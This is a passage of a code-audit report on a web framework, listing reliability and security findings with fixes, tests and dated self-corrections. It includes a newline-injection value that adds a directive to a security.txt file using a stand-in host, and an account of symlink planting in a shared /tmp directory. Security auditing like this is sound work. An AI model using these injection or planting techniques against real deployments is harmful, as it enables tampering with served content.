**Tests:** hard to unit-test; a shell assertion in the existing smoke scripts
(`ruvyxa check --root examples/demo | head -1` exits 0) is the practical gate.

**Correction (2026-08-30, from implementing this):** the seven functions named are 15 of **91**
stdout print macros -- `ruvyxa_cli` has 58 of its own and `ruvyxa_dev_server` 18, and a closing pipe
is felt by whichever of the 91 prints next. Only the TUI's 15 are routed through the helper in this
change, so the class is **not closed**: `ruvyxa check | head -1` can still panic from a `println!`
in `commands.rs`. Closing it is either those 76 call sites routed through the same helper, or one
process-level policy in `ruvyxa_cli`'s `main` -- which is the cheaper answer and the only one that
reaches `ruvyxa_dev_server` without editing it. The decision worth keeping from the helper is that
only `BrokenPipe` is quiet: every other write failure raises the panic `println!` would have,
because a full disk under a redirected stdout is real.

**GMDT-13 — The route manifest is written non-atomically.** _Reliability._ `write_manifest` uses
`fs::write`, which truncates and then writes, so the file is observably empty or partial for the
duration. **Impact:** limited and honest — truncated JSON always fails to parse, so a consumer fails
loudly rather than acting on a half-manifest. The realistic harm is an interrupted build leaving a
zero-byte `routes.json` that looks present to any check that only tests for existence, and a
concurrent reader (`ruvyxa start` against a directory being rebuilt) seeing a transient parse error.
The "looks present" half was not fully confirmed — not every consumer was audited for an
existence-only check. **Fix:** write to `output_file.with_extension("json.tmp")` in the same
directory and `fs::rename` over the target; rename is atomic within a filesystem on both Unix and
Windows. **Risk:** a leftover `.tmp` if the process dies between write and rename — name it with the
process id or clean it on the next successful write. On Windows, `fs::rename` over an existing file
fails if a reader holds it open with a non-sharing handle; the manifest is read and closed, so this
is unlikely but is the failure mode to watch. **Tests:** the temp file does not remain after a
successful write, and an existing manifest is replaced rather than appended to.

**Correction (2026-08-30, from implementing this):** the recommended
`output_file.with_extension("json.tmp")` is the exact naming
`crates/ruvyxa_bundler/src/atomic_file.rs` documents as a defect it had already removed -- a
temporary derived from the target alone gives two concurrent writers one file between them, so each
can rename what the other is still writing. That module is the workspace's durable publish and every
other cache here already uses it, so this is one call rather than a fourth local copy of the four
steps; it also carries the retry a Windows sharing violation needs and the cross-device fallback.
The two tests the finding proposes both pass against `fs::write` and therefore hold nothing. What
does distinguish the two is a reader: a handle opened on the previous manifest sees the next build's
bytes after a truncating write and still sees the document it opened after a rename. That is
deterministic on both platforms and is what the test asserts.

## JS runtime compiler half

**RTMC-07 — Package `exports` targets are joined lexically, without the canonicalize-and-contain
check the Rust resolver applies.** _Reliability (parity) / Security._ **Confidence: CONFIRMED by
reading both sides; not reproduced — needs a symlink.** `resolveExportTarget` and
`resolvePackageRelative` call `isSafePackageRelativePath` (which rules out `..`, absolute paths and
backslashes — every _lexical_ escape) and then `path.join` + `existsSync`. The Rust mirrors take the
canonicalization they need for the existence probe anyway and reuse it for containment:
`canonical.starts_with(package_root)`. A symlink is not lexical, and only canonicalization sees it.
**Impact:** small but real, in two forms. The security form is the weaker one — the escaping path is
chosen by an installed package, which can already run install scripts. The parity form is the one
that matters: the two graphs answer the same import with different files, the failure mode this
repo's resolution rules exist to prevent. Separately, Rust returns the **canonical** path and JS the
**lexical** one, so under pnpm the same module is named by its symlink path in one graph and its
store path in the other; `moduleGraphKey` repairs this for graph identity but `module.filePath` —
which feeds `isProjectLocal`, `projectInputPaths` and `readFiles` — keeps the lexical spelling.
**Fix:** resolve through `realpathSync` (falling back to the lexical path when it throws, as
`realImporterDir` already does) and require the result to start with the realpath of `pkgDir`.
**Risk:** returning canonical paths changes `module.filePath` for every package module under pnpm,
which changes `readFiles`, `inputs`, and any client-reference id measured from a package file —
landing the containment check _without_ changing the returned path is the conservative half and can
go first. **Tests:** add a symlink case to the `unsafeRelativePaths` replay in both languages,
skipped on hosts that cannot create symlinks.

**RTMC-08 — `compareCodeUnits` documents parity with Rust `String` ordering, which does not hold
above the BMP.** _Reliability (parity)._ JavaScript `<` compares UTF-16 code units; Rust
`String: Ord` compares UTF-8 bytes, which is code-point order. They disagree wherever a surrogate
pair meets U+E000–U+FFFF: for `"\uE000x"` vs `"\u{1F600}x"`, JS says `a > b` and Rust says `a < b`.
**Impact:** the sites this feeds are cache keys, content fingerprints, `import.meta.glob` key order,
and emitted bytes — so the two graphs would emit different bytes for the same project. Very unlikely
to fire, since it needs both character classes in one sorted set of file names; recorded because the
whole point of this module is that ordering is a contract, and the contract is documented as
stronger than it is. **Fix:** either correct the comment to say the rule is code-unit order and is
_not_ code-point order (accepting the divergence explicitly), or make `compareCodeUnits` compare by
code point (`[...left]` vs `[...right]`, or the standard surrogate fix-up). The second keeps the two
graphs byte-identical. **Risk:** changing the comparator changes sort order only for strings
containing astral characters, so emitted bytes move only for projects that have them. **Tests:** an
astral-vs-private-use pair in a small `ordering-conformance.json` replayed by the Rust
`alias_pattern_order` test and by a JS test.

**Correction (2026-08-30, from implementing these):** `RTMC-08` was implemented as its second option
-- comparing by code point -- and the comparator was renamed to `compareCodePoints` across its
twenty call sites. Leaving the name as `compareCodeUnits` while changing what it does would have
replaced one false claim with another, and the finding's own point is that this module's contract
was documented as stronger than it was. `tests/fixtures/ordering-conformance.json` is replayed by
`resolver.rs` against `str::cmp` and by a Node test against the comparator, both directions of each
pair, so the two orderings cannot drift apart again.

`RTMC-07` was implemented as the conservative half the entry itself recommends landing first: the
containment check, without changing the returned path. Returning canonical paths would move
`module.filePath` for every package module under pnpm, and with it `isProjectLocal`,
`projectInputPaths`, `readFiles` and every client-reference id measured from a package file -- a
separate change with a separate blast radius. One detail the entry does not mention: the containment
comparison has to be `path.relative`, not a string prefix, or a sibling package whose directory name
extends the real one (`pkg-extra` beside `pkg`) is accepted as inside it. The symlink case runs
unskipped on this Windows host; the test reports whether the host supports symlinks at all rather
than passing quietly when it does not.

## JS runtime server half

**RTMS-06 — `shutdown()` can `process.exit(0)` on top of an unflushed `ping`/`invalidate`
response.** _Reliability._ `shutdown` exits immediately when `admission.activeRequests === 0`, and
`needsSlot` is false for exactly `ping` and `invalidate` — so those two never increment the only
counter `shutdown` waits on. Their responses go out through `writeWorkerMessage`, whose own
docstring says "stdout is a pipe here and `process.exit()` does not drain a queued asynchronous
write", and `rl.on('close', () => shutdown('stdin-close'))` fires as soon as the host closes stdin.
**Impact:** the final `ping` or `invalidate` response can reach `worker_pool.rs` truncated, which it
reports as unparsable worker output. Bounded to shutdown, so no request is lost — but it turns a
clean retirement into a spurious error line, and the same shape has been the root of harder bugs in
this repo. **Fix:** track slot-less work too — a counter incremented before `dispatchRequest` and
decremented in the same `finally` for `needsSlot === false` — and exit immediately only when both it
and `activeRequests` are zero; the existing unref'd 5-second timer covers the rest. **Risk:** a
worker whose ping handler hangs would wait up to the existing 5-second ceiling rather than exiting
instantly; that ceiling already exists for renders. **Tests:** write a `ping` line and close stdin
in the same tick, then assert the collected stdout parses as complete NDJSON.

**Correction (2026-08-30, from implementing this):** the counter gap is real and the fix is cheap,
but the impact does not reproduce and the entry's own reproduction is what shows it. A `ping` (and
an `invalidate`) written with stdin closed in the same tick is answered whole, every time: 200 pings
written and closed in one tick were all answered, against the _unfixed_ code. The reason is ordering
rather than luck -- readline emits `close` as a macrotask, and both slot-less handlers settle within
microtasks of their `line` event, so the response is written before `shutdown` runs.

So the described symptom -- a truncated final frame reported as unparsable worker output -- is not
reachable through either slot-less request type today. The fix is kept because the gap is
structural: `shutdown` consulted a counter that by construction never counts `ping` or `invalidate`,
and the first slot-less request type that awaits real I/O inherits the bug. It is _not_ accompanied
by a test, deliberately: the two tests written for it passed against the unfixed code in twelve
consecutive runs, which would have made them exactly the kind of gate this programme keeps finding
-- one that exists, passes, and structurally cannot observe the defect it names. They were deleted
rather than kept green.

**Retracted (2026-08-30):** an earlier revision of this paragraph reported
`node scripts/smoke-dev-server.mjs` as failing its second check and said the cause needed its own
investigation. That was operator error, not a defect. The smoke is written for
`examples/deploy-smoke` — which is what `ci.yml` and `release.yml` both invoke it with — and it was
run against `examples/demo`, whose `app/not-found.tsx` renders "Page not found" and contains the
literal `not-found` nowhere. Against the app root it is written for, all 21 checks pass. Nothing was
broken; the record is corrected here rather than quietly deleted, because a false regression report
costs the next reader the same investigation.

**RTMS-08 — `worker-pool.mjs` re-implements three payload/response helpers that already exist in the
shared modules it imports from.** _Maintainability._ `parsePayload` is a character-for-character
duplicate of `parseActionPayload` in `action-runtime.mjs`, down to the
`try { JSON.parse } catch { URLSearchParams }` fallback and the `'input' in parsed` unwrap;
`normalizeActionResult` duplicates its neighbour; `normalizeResponse` duplicates `api-renderer.mjs`
and `serverless-handler.mjs`, including the RUV1504 message text. The worker already imports two
other functions from `action-runtime.mjs`, and that import's own comment says the copy that used to
live here "spelled the same limits a different way … which is the state a rule is in just before it
drifts." **Impact:** raises defect risk on the next change rather than causing one today. The three
copies agree now; the payload parser in particular decides how an action's input is decoded, and a
content-type rule fixed in `action-runtime.mjs` would leave `ruvyxa dev`/`start` behaving
differently from every deployed build — the exact failure class `api-methods.mjs` was created to
end. Reported because the file already carries a written rule against it. **Fix:** import
`parseActionPayload` and `normalizeActionResult` and delete the local copies. `normalizeResponse`
has three homes and no shared one; the smallest correct move is to export it from `api-methods.mjs`
(already carried into every function bundle) and import it in all three. **Risk:** none behavioural
if the copies are truly identical — which should be asserted by the test below _before_ the
deletion, not after. **Tests:** a table replaying the same `(payload, contentType)` pairs through
both entry points and asserting equal output, added before the consolidation so the equivalence is
proven rather than assumed.

**RTMS-09 — Two loaded copies of `request-context.mjs` install one reader over two storages.**
_Reliability._ **Confidence: SPECULATIVE.** The reader half is assigned unconditionally onto
`globalThis` (last-writer-wins) while `runWithRequestContext` is per module instance. The module's
own comment states the premise — "the last one loaded is the one whose `runWithRequestContext` the
host will call" — which is an assumption about load order, not something the code can enforce.
**What would confirm or kill it:** in a function bundle carrying both the copied sibling and a
second copy reached through a dependency's `dist`, log which module object each of
`globalThis.__RUVYXA_REQUEST_CONTEXT__` and the host's imported `runWithRequestContext` belongs to.
**Impact if the order ever inverts:** `cookies()`, `headers()`, and `draftMode()` throw "was called
outside a request" for every request in a deployed build, and `usedRequestContext` reports `false` —
which would additionally let a request-scoped render be stored (see RUV-C1). It fails closed on the
accessors and open on the cacheability flag, so the second half is the dangerous one. **Fix:** make
the pair symmetric — have `runWithRequestContext` call
`globalThis.__RUVYXA_REQUEST_CONTEXT__.run(...)` (adding a `run` to the installed object) so
whichever copy is installed owns both halves. **Risk:** low, but it changes the module's contract;
the standalone-copy tests that assert the file set must keep passing unchanged. **Tests:** import
two distinct copies (via a `?v=` query on the file URL), call copy A's `runWithRequestContext`, and
assert the globally installed reader sees the store.

## `@ruvyxa/core`, react, testing

**CORE-08 — The Bun and Deno transports omit the default security headers on `/__ruvyxa/health`,
`/__ruvyxa/metrics`, and the transport-level 500.** _Reliability._ Node applies the defaults to the
mutable `res` at the top of the request, so every path carries them. The fetch transports apply them
in only two places — `staticResponse` and `withSecurityHeaders(response)` on the handler result —
and return three responses through neither: the health early-return, the metrics early-return, and
the Bun `error` / Deno `onError` hooks, which sit outside `handleRequest` entirely. The Axum host
applies its seven as the outermost `map_response` over the whole router, so _its_ `/__ruvyxa/health`
does carry them. **Impact:** on a Bun or Deno deployment, `/__ruvyxa/health` and `/__ruvyxa/metrics`
are served with no `X-Content-Type-Options: nosniff`, no `X-Frame-Options`, and no
`Cross-Origin-Resource-Policy`, and the transport's own 500 is a bare `text/plain` with none of
them. More importantly it is a same-file, same-build divergence in a module whose entire premise is
that "the question 'does a Bun deployment behave like a Node one' is answered by construction" — and
the conformance suite's security-header assertion probes only `/logo.png` and `/`, so the gate looks
like it covers this and does not. **A second, latent asymmetry:** `staticResponse` sets the defaults
**over** the plan's headers while Node sets them **under**; no name collides today, so the two agree
only by coincidence. **Fix:** wrap the two early returns in `withSecurityHeaders(...)` and wrap the
bodies of both runtime error hooks the same way; make `staticResponse` use `if (!headers.has(name))`
so the plan wins on both transports, matching Node and matching Axum's insert-if-absent. While
there, `metricsResponse` should answer 405 with `Allow: GET, HEAD` for a non-read method, as
`/__ruvyxa/health` already does, rather than falling through to a route-miss 404. **Risk:** none
identified. `withSecurityHeaders` is already a no-op when headers are disabled, and neither response
produces a sliced `BunFile`, so the Bun stream trap does not apply. **Tests:** extend the existing
"applies the security defaults to both static files and rendered pages" case to also probe
`/__ruvyxa/health` and an authorised `/__ruvyxa/metrics`; both already run for all three runtimes.

**CORE-09 — `router.retry()` clears the pending flag without notifying subscribers when the payload
fetch fails.** _Reliability._ `finally { pendingNavigationId = null }` clears the flag and the
rejection propagates, so `refresh()` — the only `emit()` on this path — never runs. `getPending()`
now returns `false`, but `useSyncExternalStore` was never notified, so the value React last rendered
stands. Every other failure path in the file pairs the clear with an emit. **Impact:** a stuck
loading indicator after a failed retry — the moment the user is most likely to press the button
again — and a disabled submit button that never re-enables, if the application wired one to
`pending`. Purely UI state; no data is wrong. **Fix:** move `emit()` into the `finally` beside the
clear. `refresh()` emits again on the success path, which is harmless — `useSyncExternalStore`
compares the snapshot reference and the second emit finds `pending` unchanged. **Risk:** one extra
notification per successful `retry()`; subscribers bail out when the read value is unchanged, so no
extra render results. **Tests:** install a `fetch` stub rejecting the flight request, subscribe a
listener, call `router.retry()`, catch the rejection, and assert both that `getPending()` is `false`
**and** that the listener fired.

**CORE-10 — `isrCache: 'tmp'` writes to a fixed, unnamespaced `os.tmpdir()/ruvyxa-isr-cache`.**
_Reliability._ The path contains no build id, no adapter name, no port, and no process identity —
the same directory for every Ruvyxa deployment on a host and for every build of the same deployment
— and it is read _before_ the bundled prerender output, so a stale entry wins. `adapter-aws` is the
only adapter that passes `isrCache: 'tmp'`, but three others inline the same unnamespaced constant
themselves. **Impact:** on a single-tenant container — the AWS Amplify case this was written for —
the blast radius is one deployment's own stale entries after a redeploy: a broken first render per
ISR page per container, self-healing after the revalidate window, whose
`<script src=".../app.<oldhash>.js">` 404s. On a shared host it becomes cross-application document
serving; and on Linux `os.tmpdir()` is `/tmp`, mode 1777, so a pre-planted file or symlink at a
known route path is served as the page and `writeFileSync` through a planted symlink writes wherever
it points. **Fix:** derive the directory — `path.join(os.tmpdir(), 'ruvyxa-isr-cache', <buildId>)`,
where `buildId` is already derived from the emitted output and is available through `options` — and
create it with `mkdirSync(dir, { recursive: true, mode: 0o700 })`. That fixes the cross-application
and stale-build cases outright and reduces the shared-host case to a pre-creation race on an
unguessable name. **Risk:** an in-place restart loses its warm ISR cache once, because the directory
name changes with the build — the correct behaviour, and the bundled `prerenderDir` still answers
the first request. **Tests:** assert the emitted source does not contain the bare literal as a
complete path segment list; in the conformance suite, stage two deployments with different build ids
and assert one does not read the other's ISR write.

**Correction (2026-08-30, from implementing this):** the defect and its impact are real and were
reproduced — a second build staged over the first, on the same path, served the first build's
document — but two things in the recommended fix were wrong on contact. First, `buildId` is _not_
"available through `options`": `StandaloneServerOptions` had no such field and the generator has no
route to `manifest.json`, so it had to be added to the interface and passed by the one adapter that
sets `isrCache: 'tmp'`, from `ctx.deployManifest?.buildId` — which is `undefined` whenever the build
output predates the deploy manifest or postdates what `@ruvyxa/core` parses, a case the fix has to
answer. Second, the build id alone does not separate two _different applications_ on one host: it is
derived from the emitted output, so it distinguishes builds of one project and says nothing about
which project. The directory is therefore named from a hash of the build id **and** `here`, the path
the bundle was deployed to: the build id is what changes across a redeploy to one path, and `here`
is what differs between two deployments on one machine. Hashing rather than joining also means a
caller-supplied string never becomes a path segment unvalidated. The startup `mkdirSync` is
fail-soft with a warning rather than fatal, because an ordinary ISR write is already fail-soft in
`persistPrerendered` and a host with an unwritable temporary directory must keep serving pages
rather than fail to boot.

**CORE-11 — `popstate` navigation restores no scroll position and the router never takes
`history.scrollRestoration`.** _Reliability._ **Confidence: SPECULATIVE.** The `popstate` handler
navigates with `scroll: false` on the reasoning that "restoring scroll is the browser's job here",
history entries carry no scroll data, and `history.scrollRestoration` is never read or set anywhere
in the package. **What would confirm or kill it:** scroll halfway down a long route, `<Link>` to
another, press Back, and observe where the viewport lands once the previous route's tree has
re-rendered. **Root cause if real:** with the default `history.scrollRestoration === 'auto'` the
browser restores the offset at the moment `popstate` fires — before this router has fetched
anything, before React has re-rendered, and therefore against a document whose height is still the
_outgoing_ page's. **Impact:** Back and Forward land at the wrong scroll position on soft
navigations, most visibly when the two routes differ in length. Cosmetic, but it reads as the router
being broken. **Fix:** if confirmed, take `window.history.scrollRestoration = 'manual'` at
construction (guarded — it is not settable everywhere), record `scrollY` into the state object in
`pushHistoryEntry`, and restore it after the render completes in the `history === 'none'` branch.
**Risk:** taking `'manual'` also disables the browser's restoration for _hard_ loads in the same
session, so the manual path must be complete before it is taken — a partial implementation is worse
than the current behaviour. **Tests:** a browser-driven check; the stubbed `window` in the unit
suite can only assert that `scrollRestoration` is set and that an offset round-trips through the
history state.

## auth, database, realtime, plugins

**SEC-08 — The `webVitals` collector is unauthenticated and unthrottled.** _Security._ The route is
registered with no origin check, no rate limit, and no per-client bucket. `normalizeWebVitalsEntry`
correctly constrains the _shape_ — an enum for `name`, a finite non-negative `value`, a `/`-prefixed
`pathname` under 2048 chars — and the plugin's own docstring shows the author considered the payload
("The endpoint is reachable by anyone, so an unvalidated payload would let a third party write
arbitrary strings and numbers into the application's logs") without considering the volume.
**Impact:** log-ingestion cost amplification (per-GB billing), retention windows shortened by flood,
and up to 2 KB of attacker-chosen `pathname` per record polluting performance dashboards with
fabricated data. Not a compromise, but a cheap and durable nuisance. **Fix:** add a `rateLimit`
option with a conservative default, using the same `clientIp`-resolver shape `@ruvyxa/auth` uses so
the caller decides what may be trusted, and document that the endpoint should sit behind the
platform's WAF where one exists. **Risk:** a too-tight default drops real beacons from a large
shared egress (an office, a mobile carrier) and quietly biases the metrics — the opposite of what
the plugin is for. Default generously and make it configurable. **Tests:** submit past the budget
and assert the surplus is not passed to `logger`.

**SEC-09 — Built-in OAuth providers surface `email` without recording whether the IdP verified it.**
_Security._ `mapProfile` for Google reads `sub`, `email`, `name`, `picture` and drops
`email_verified`, and `AuthUser` has no field that could carry it forward to the session, so a
consumer cannot re-derive it. **Impact:** low as shipped, because account identity is keyed on `id`
(`google:${sub}` / `github:${id}`), which is safe. It becomes an account-takeover path only for an
application that links or authorizes on `session.user.email` — a common enough pattern (matching an
OAuth login to an existing credentials account) that the framework should not make it look safe.
OIDC Core §5.7 states that `email` must not be treated as a verified identifier unless
`email_verified` is true. GitHub's `/user` email is selected from the account's verified addresses,
so `github()` is not exposed the same way. **Fix:** add `emailVerified?: boolean` to `AuthUser`,
populate it from Google's `email_verified` (and `true` for GitHub, with a comment saying why), and
state in the README that `user.email` must not be used to link accounts unless `user.emailVerified`
is true. **Risk:** none to the token bytes or the session shape on the wire — the field is additive
and `structuredClone(user)` carries it through. **Tests:** a `google()` mapping case asserting a
profile with `email_verified: false` produces `emailVerified: false` on the session user.

**SEC-10 — `pwa()` accepts a `scope` broader than the service worker's own directory.**
_Reliability._ `serviceWorkerPath` and `scope` are validated independently and never compared, and
the header that makes a broad scope legal — `Service-Worker-Allowed` — is emitted only from the
plugin's own request handler. `build.onComplete` writes the same file as a plain public asset with
no header attached, and a repository-wide grep finds `service-worker-allowed` at exactly one line:
no adapter, no platform config, and no Rust static handler reproduces it. **Impact:** silent
dev/prod divergence in service worker registration for any project that moves `sw.js` out of the
root — `SecurityError: The path of the provided scope ('/') is not under the max scope allowed` in
production only. The default configuration (`/sw.js` with scope `/`) is unaffected, because a
root-level worker already defaults to `/`, which is why this has not been hit. This is the same
shape as the recorded CDN-served security-headers defect — a header that exists only on the
origin-served path. **Fix:** reject at config time any `scope` not within the directory of
`serviceWorkerPath` unless the project opts in explicitly, so the plugin stops depending on a header
it cannot guarantee downstream. If broad scopes must be supported, the fix instead belongs in the
adapters and needs a matching per-platform header rule. **Risk:** a project relying today on the
dev-only broad scope starts failing at config time instead of at runtime in production — the intent,
but a breaking change for that configuration. **Tests:** extend the "rejects colliding or non-file
artifact paths" case with
`assert.throws(() => pwa({ name: 'X', serviceWorkerPath: '/assets/sw.js', scope: '/' }))`.

**SEC-11 — `wellKnown` skips the control-character check on `securityTxt.contact` and validates
`entries[].contentType` only at request time.** _Security._ Every other URL field in the same
function goes through `validateAbsoluteHttpUrl`, which rejects `[\r\n\0]`; `contact` is checked for
a scheme prefix only and then interpolated into a `Contact: ${contact}` line. Separately,
`entry.contentType` is stored unvalidated and only reaches a `Headers` constructor at request time.
**Impact:** both inputs are developer-supplied config, not request data, so this is not remotely
reachable. The concrete cost is a config typo producing a 500 on a `/.well-known/` path in
production instead of a build-time `TypeError`, and a `security.txt` whose directives a copy-pasted
contact string can silently extend (`mailto:a@b.c\nPolicy: https://evil.example`). **Fix:** add
`if (/[\r\n\0]/.test(contact)) throw …` to the `createSecurityTxt` loop, and probe
`entry.contentType` through a throwaway `new Headers().set('content-type', value)` at config time —
the same "load-bearing despite discarding its result" technique `cacheRules` already uses. **Risk:**
none; both changes only reject inputs that already fail, earlier. **Tests:** a `contact` containing
`\n` and a `contentType` containing `\r\n` each throw at construction.

## Deploy adapters, scaffolding

**ADP-04 — `render.yaml` and `railway.json` interpolate a configured `outDir` into an unquoted YAML
scalar and an unquoted shell command.** _Reliability._ Render's blueprint is assembled by string
concatenation with the service name escaped through `JSON.stringify` and the path not:
`'    startCommand: node ' + serverEntry`. `projectRelativeOutDir` normalizes separators and strips
trailing slashes and does not constrain the characters, which come from `ruvyxa.config.ts`. A `#`
starts a YAML comment and truncates the command; a `: ` turns the scalar into a nested mapping and
fails the parse; a space produces valid YAML and an invalid shell command. Railway builds its config
with `JSON.stringify` so the file always parses, but the same path lands unquoted inside
`startCommand: \`node
${serverEntry}\``. `adapter-static`validates the equivalent input properly. **Impact:** a project with a space or a YAML metacharacter in`outDir`gets a deployment that fails at start with no build-time signal. Low because`outDir`is the project's own configuration and the default is safe — but the failure lands on the platform, not on the developer's machine, which is the expensive place to find it. **Fix:** validate`relativeOutDir`at the top of`build()`in both adapters and throw`RUV2001`when it contains anything outside`[A-Za-z0-9._/-]`, naming `outDir`in the message; in`adapter-render`, additionally emit the blueprint through a YAML-quoting helper, or at minimum wrap `startCommand`in double quotes with the path escaped. **Risk:** a project already deploying successfully with an unusual-but-working`outDir`starts failing the build — keep the allowed set wide so only genuinely unsafe paths are rejected. **Tests:** both adapters already have "points the start command at the configured out directory"; add cases asserting an`outDir`containing a space or`#`is rejected with`RUV2001`.

**ADP-05 — `adapter-static` emits `_headers`, which only two of the hosts it names can read.**
_Security._ The docstring names "GitHub Pages, S3, Netlify CDN, etc."; the only header mechanism
emitted is a `_headers` file, whose own comment scopes it to Netlify and Cloudflare Pages and adds
"hosts that ignore the file are unaffected by its presence." There is no static-target equivalent of
the per-platform config the other adapters emit, and the adapter declares `supports: ['ssg', 'csr']`
— so every page it deploys is a CDN-served pre-rendered document, the exact case where
`createHandler` never runs. **Impact:** a static deployment to GitHub Pages, S3, or any other host
without a `_headers` reader is framable and MIME-sniffable, and re-fetches every asset on every
navigation, while the developer has no way to learn this from the build. Low because the affected
hosts are ones where the operator configures headers at the CDN anyway — but it is the one adapter
whose entire output is CDN-served, so it is also the one where the gap covers 100% of responses.
"Unaffected by its presence" is true about the file and false about the deployment. **Fix:** narrow
the docstring to the hosts `_headers` actually reaches and say plainly that other hosts need headers
configured at the CDN; or better, add the fact to `tests/fixtures/adapter-contract.json` as a third
required capability (`cdnResponseHeaders`) so `ruvyxa build` reports it the way it reports a missing
image pipeline — which is the pattern the fixture's own `$comment` argues for. **Risk:** none for
the docstring change. Adding a contract key requires updating all eleven entries and
`scripts/sync-adapters.mjs`, which regenerates the adapter matrix in both docs languages and fails
the build if the tables go stale — so the change is self-checking. **Tests:** `sync-adapters.mjs`
already fails on a missing boolean; extend it and add the matching assertion.

**ADP-06 — `create-ruvyxa` validates only the basename of the target, so a path argument escapes
every name check.** _Security._ `const dirName = basename(trimmed)` and every subsequent check reads
`dirName`, never `trimmed`; `resolve(trimmed)` comes afterwards. So `../../my-app` passes (basename
`my-app`), `/etc/my-app` and `C:\Windows\Temp\my-app` likewise — `basename` strips the drive letter
that the invalid-character check would otherwise reject — and `nul/my-app` bypasses the
reserved-Windows-name check for intermediate segments. The write is guarded (the target must be
absent or an empty directory), so this cannot clobber existing files. **Impact:** low, and worth
being honest about why: the argument is typed by the user on their own machine, and
`create-ruvyxa ~/projects/foo` is a legitimate thing to want, so this is not a trust boundary being
crossed. The concrete cost is that the safety checks the function advertises do not cover the value
that is actually resolved, and the empty-directory guard is the only thing between a mistyped path
and a project scaffolded somewhere surprising. It is also a TOCTOU window between `existsSync`,
`readdir`, and `cp`. **Fix:** validate every segment of `trimmed`, not just the last, and decide
deliberately whether `..` and absolute paths are allowed — keeping them is reasonable, but then say
so in the error messages and echo the resolved absolute path in the confirmation before writing, so
a mistyped path is visible before the files land rather than after. **Risk:** rejecting `..`
outright breaks anyone scaffolding into a sibling directory, which works today; validating segments
without banning traversal has no behavioural regression. **Tests:** cases for `../x`, an absolute
path, and `nul/x`, asserting the documented behaviour rather than today's accidental one.

## Dependencies, scripts, CI

**DEP-07 — `bump-version.mjs` rewrites every manifest in a format Prettier rejects.** _Reliability._
`writeFileSync(file, JSON.stringify(pkg, null, 2) + '\n')` — but the manifests in the tree are
Prettier-formatted, and Prettier's JSON printer collapses an array that fits inside
`printWidth: 100` while `JSON.stringify` never does. `pnpm format:check` is a CI step on all five
platforms and a `verify-release` step. **Impact:** `pnpm release:bump` leaves the tree failing a CI
gate. Recoverable in one command once the cause is understood; the cost is that the failure names
~20 files and none of them names the bump. **Fix:** append a `prettier --write` over the touched
files at the end of the script, or change the `release:bump` script to
`node scripts/bump-version.mjs && pnpm format`. **Risk:** none meaningful. **Tests:** run the bump
against a temp copy of a manifest and assert the result equals
`prettier --stdin-filepath package.json` of the same content.

**DEP-08 — `check-silent-defaults.mjs` misses `unwrap_or(...)` and any non-`_` error binding.**
_Reliability._ `FABRICATE = /unwrap_or_default\(\)|unwrap_or_else\(\s*\|_\|/` lets three inputs
through: plain `unwrap_or(value)` (two live sites fabricate from a failed parse —
`static_assets.rs:231`'s `text.parse::<u64>().unwrap_or(u64::MAX)` and `i18n.rs:112`'s quality
default — both carrying a written justification in a nearby comment, so neither is a live defect,
but the gate exists precisely so that justification lives in the reviewed list rather than in a
comment nobody re-reads); `unwrap_or_else(|_error| …)`, because the regex requires the binding to be
literally `_`; and any chain whose `unwrap_or_default()` lands past the four-line statement window.
**Impact:** the check reports "no failed read invents a value outside N reviewed sites" while three
spellings of exactly that can pass. Low because the class it does catch is the common one. **Fix:**
widen to `/unwrap_or_default\(\)|unwrap_or_else\(\s*\|[_a-z]|unwrap_or\(/` and raise the window to
about 8, then add the two live sites to `ALLOWED` with the reasons their comments already give.
**Risk:** `unwrap_or(` is common enough that widening will surface a batch of sites on first run,
each needing an entry or a fix — the intended one-time cost, but it should land as its own change.
**Tests:** a fixture-driven test with a Rust snippet exercising each of the four spellings,
asserting all four are reported.

**Correction (2026-08-30, from implementing this):** two of the three prescribed changes were wrong
in a way the first run made visible. Raising the statement window to eight lines does catch a longer
chain, and it also joins genuinely separate statements — it reported a `?`-propagated read against
an unrelated `unwrap_or_else` four lines below it, and a `path.parent().unwrap_or(&root)` against a
`read_to_string` on the line above. A window that invents pairings is worse than one that misses a
long chain, because a false report is what teaches people to stop reading the output. The window
stays at four and the statement is split on `;` instead, so the fallible call and the combinator
have to be in one statement. And the widened `unwrap_or_else(\\s*\\|[_a-z]` pattern matches
`unwrap_or_else(|error| panic!(…))`, which is the opposite of fabricating: it reports the failure as
loudly as a process can. Panicking closures are excluded by shape rather than by allowlist entry,
because there are several.

With those two corrections the first run surfaced eleven sites, not the two the entry predicts. All
eleven are environment-variable or `Option` defaults and are now in `ALLOWED` with individual
reasons. The check also gained the test the entry asks for — it had none, which is why two of the
three spellings could not have been shown to pass.

**DEP-09 — `crates/` and `templates/` are still walked with the unguarded `readdirSync` +
`readFileSync` that `workspace-packages.mjs` was written to eliminate.** _Reliability._
`workspace-packages.mjs` documents the incident at length — "a package removed from git while its
`dist/` and `node_modules/` stayed on disk" crashed these scripts with an unhandled `ENOENT` — and
the same shape survives in two loops in the very file that imports it, plus one in
`bump-version.mjs` (whose `templates/` loop _is_ guarded, so the two files disagree about whether
this matters). **Impact:** the same "release:validate failed on a clean working tree, naming a file
nobody touched" failure, if residue ever appears under `crates/` or `templates/`. Build residue is
less likely there than under `packages/`, since nothing writes to them, which is why this is Low.
**Fix:** generalise `workspacePackageDirs()` into a `manifestDirs(parent, manifestName)` helper and
use it for `crates/*/Cargo.toml` and `templates/*/package.json` too, reporting skipped directories
as the existing code already does. **Risk:** a crate directory that genuinely lost its `Cargo.toml`
would be skipped rather than crashing — acceptable, because `cargo metadata --locked` in
`pnpm check:cargo-lock` is the gate that would catch a workspace member with no manifest. **Tests:**
create a manifest-less directory under a temp `crates/` and assert the script reports it and
exits 0.

**DEP-10 — The `@types/node` gate compares only the major, and the versions have drifted six minors
apart.** _Dependency._ `workspaceNodeTypesVersion?.split('.')[0] === requiredRuntimeNodeMajor`
against `"@types/node": "24.13.3"` and `"engines": { "node": ">=24.19.0" }`. The sibling checks in
the same block are exact — `.node-version` must equal the major and `.nvmrc` the full floor, and
both hold. Only `@types/node` is compared loosely, and it is the one that has drifted. **Impact:**
APIs added in Node 24.14 through 24.19 are untyped for every workspace package while `engines.node`
promises they are available, so `tsc` reports an error on code that would run correctly at the
declared floor. Minor, and self-announcing when it bites. **Fix:** compare `major.minor` and bump
`@types/node` to the `24.19.x` line; if a matching minor does not exist for a given Node minor,
require `>=` on the minor rather than equality, with the reason written into the failure message.
**Risk:** tightening fails immediately until the bump lands, and a bump can surface new type errors
in strict mode — land both together. **Tests:** the check is the test; extend the failure message to
state both numbers.

